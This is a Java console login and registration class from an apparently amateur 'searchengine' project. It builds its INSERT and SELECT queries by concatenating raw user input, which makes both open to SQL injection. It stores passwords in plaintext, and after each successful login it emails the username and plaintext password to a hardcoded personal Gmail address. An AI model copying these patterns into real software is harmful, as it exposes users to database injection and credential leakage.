package com.searchengine.notifications;

import java.sql.Connection;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;
import java.util.Scanner;

import org.apache.log4j.Logger;

import com.searchengine.searchhistory.ConnectionFactory;

public class Login {

	static Logger log = Logger.getLogger(Login.class);

	public void reg() {
		Scanner sc = new Scanner(System.in);

		System.out.println("Enter the full name to register :");
		String fname = sc.nextLine();

		System.out.println("Enter the user name");
		String un = sc.nextLine();

		System.out.println("Enter the password");
		String pass = sc.nextLine();

		System.out.println("Enter your role");
		String r = sc.nextLine();

		Connection connection = null;
		connection = ConnectionFactory.create();
		int st = 0;

		try {
			Statement stm = connection.createStatement();
			String query = "INSERT INTO UserCredentials VALUES('" + fname + "','" + un + "','" + pass + "','" + r
					+ "')";

			st = stm.executeUpdate(query);

		} catch (SQLException e) {

			log.error(e.getMessage());
		} finally {

			if (connection != null) {

				try {
					connection.close();
				} catch (SQLException e) {

					log.error(e.getMessage());
				}
			}

		}

		if (st != 0) {
			System.out.println("Sucessfully Registered");

		} else {
			System.out.println("Registeration Not Sucessfull ");

		}

	}

	public void login() throws Exception {
		Scanner sc = new Scanner(System.in);
		boolean status = false;
		System.out.println("Enter the Username");
		String uname = sc.nextLine();
		System.out.println("Enter the Password");
		String upass = sc.nextLine();
		Connection connection = null;
		connection = ConnectionFactory.create();
		try {
			String query = "SELECT * From UserCredentials where UserName='" + uname + "' and Password='" + upass + "'";
			Statement st = connection.createStatement();
			ResultSet rs = st.executeQuery(query);
			while (rs.next()) {
				status = true;
				System.out.println("Welcome " + rs.getString("userName") + " you have Logged-in Successfully");
				EmailNotification.mail("shivugowda1999@gmail.com", uname, upass);
			}
		}

		catch (SQLException e) {
			log.error(e.getMessage());
		} finally {
			if (connection != null) {
				try {
					connection.close();
				} catch (SQLException e) {
					log.error(e.getMessage());
				}
			}
		}
		if (status == false) {
			System.out.println("Invalid user Name or Password");
			System.out.println("Press 1 to register or press 2 to sign in :");
			int c = sc.nextInt();
			if (c == 1) {
				reg();
			} else if (c == 2) {
				login();
			} else {
				System.exit(0);
			}

		}
	}
}